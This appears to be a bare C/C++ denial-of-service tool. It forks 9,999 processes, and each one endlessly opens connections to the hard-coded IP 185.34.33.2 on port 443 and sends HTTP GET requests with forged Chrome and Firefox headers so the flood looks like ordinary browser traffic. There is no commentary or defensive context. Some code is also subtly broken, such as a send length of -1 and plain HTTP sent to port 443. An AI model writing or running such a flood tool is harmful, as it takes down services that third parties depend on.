#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>
#include<stdlib.h>
#include<time.h>

const char*h1="GET / HTTP/1.1\r\nHost: 185.34.33.2\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129 Safari/537.36\r\nAccept: text/html,*/*;q=0.8\r\nAccept-Encoding: gzip,br\r\nConnection: keep-alive\r\nSec-CH-UA: \"Google Chrome\";v=\"129\"\r\n\r\n";
const char*h2="GET /?r=1 HTTP/1.1\r\nHost: 185.34.33.2\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\r\nAccept: text/html,*/*;q=0.9\r\nAccept-Encoding: gzip,br\r\nConnection: keep-alive\r\n\r\n";

void f(){while(1){
    int s=socket(2,1,0);sockaddr_in a{2,htons(443),inet_addr("185.34.33.2")};
    if(connect(s,(sockaddr*)&a,16)<0){close(s);usleep(10000);continue;}
    send(s,rand()&1?h1:h2,-1,0);
    char b[9999];while(recv(s,b,9999,0)>0);
    close(s);usleep(30000+rand()%70000);}}

void lt(){srand(time(0));
    for(int i=0;i<9999;i++)if(!fork())f(),exit(0);
    pause();}